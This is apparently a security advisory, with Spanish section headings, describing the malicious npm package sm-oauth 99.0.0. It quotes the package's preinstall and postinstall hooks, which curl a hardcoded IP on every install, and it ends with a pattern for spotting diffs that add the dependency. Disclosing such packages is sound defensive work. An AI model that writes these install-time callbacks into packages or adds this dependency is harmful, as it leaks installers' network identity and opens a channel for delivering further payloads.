# Aviso: Malicious code in sm-oauth (npm) (GHSA-7x7x-6w24-fch9)

## Resumen

## Source: amazon-inspector (98d60527238d1284ed569a2fa7611ff2b430e1ebfab579f597f42a1eb28f49bc)
package.json declares preinstall and postinstall scripts that run `curl -s http://16.192.173.5/sm-oauth/pre` and `curl -s http://16.192.173.5/sm-oauth/post` on every `npm install`. The requests fire against a hardcoded bare-IP endpoint over plain HTTP, leaking the installer's network identity (source IP, install event, request metadata) to that endpoint and giving the operator a channel to serve follow-on content in the HTTP response. index.js self-identifies as a dependency-confusion test artifact and exports no functional library code; the package's only behavior on install is the outbound callback.

---

Credit: [OpenSSF](https://github.com/ossf/malicious-packages) ([source](https://github.com/ossf/malicious-packages/blob/e307a23db650fb76255155feb9c7f2fecd528fef/osv/malicious/npm/sm-oauth/MAL-2026-14398.json))

## Paquetes afectados

- `sm-oauth` (npm), versiones afectadas: = 99.0.0

## Datos del aviso

- Tipo de aviso: malware
- Severidad: critical
- Publicado: 2026-08-24T06:30:34Z
- Fuente: https://github.com/advisories/GHSA-7x7x-6w24-fch9

## Patrón a vigilar

Diff que añade (o fija por primera vez) una dependencia sobre cualquiera de los paquetes listados arriba, en cualquier versión del rango afectado -- el paquete en sí ES el malware, no hace falta ningún otro cambio sospechoso en el diff para que el riesgo sea máximo.
